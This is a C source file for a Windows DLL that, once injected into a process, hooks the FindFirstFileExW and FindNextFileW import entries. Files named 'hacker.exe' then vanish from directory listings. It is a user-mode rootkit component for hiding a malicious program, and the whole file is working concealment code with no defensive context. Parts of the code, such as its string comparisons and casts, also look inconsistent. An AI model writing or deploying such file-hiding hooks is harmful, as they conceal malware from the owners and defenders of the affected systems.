#include <windows.h>

#define FILENAME "hacker.exe"
LONG IATHook(
	__in_opt void* pImageBase,
	__in_opt const char* pszImportDllName,
	__in const char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* phHook
);

LONG UnIATHook(__in HANDLE hHook);

void* GetIATHookOrign(__in HANDLE hHook);

typedef HANDLE(__stdcall *LPFN_FindFirstFileExW)(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
	);
typedef BOOL(__stdcall *LPFN_FindNextFileW)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	);
HANDLE g_hHook_FindFirstFileExW = NULL;
HANDLE g_hHook_FindNextFileW = NULL;
//////////////////////////////////////////////////////////////////////////

HANDLE __stdcall Fake_FindFirstFileExW(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
){
	LPFN_FindFirstFileExW fnOrigin = (LPFN_FindFirstFileExW)GetIATHookOrign(g_hHook_FindFirstFileExW);
	HANDLE hFindFile = fnOrigin(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	while (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
		FindNextFileW(hFindFile, (LPWIN32_FIND_DATA)lpFindFileData);
	}
	return hFindFile;
}

BOOL __stdcall Fake_FindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
) {
	LPFN_FindNextFileW fnOrigin = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
	BOOL rv = fnOrigin(hFindFile, lpFindFileData);
	if (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
		rv = fnOrigin(hFindFile, lpFindFileData);
	}
	return rv;
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		IATHook(
			GetModuleHandle(NULL),
			"kernel32.dll",
			"FindFirstFileExW",
			Fake_FindFirstFileExW,
			&g_hHook_FindFirstFileExW
		);
		IATHook(
			GetModuleHandle(NULL),
			"kernel32.dll",
			"FindNextFileW",
			Fake_FindNextFileW,
			&g_hHook_FindNextFileW
		);
		break;
	case DLL_PROCESS_DETACH:
		UnIATHook(g_hHook_FindFirstFileExW);
		UnIATHook(g_hHook_FindNextFileW);
		break;
	}
	return TRUE;
}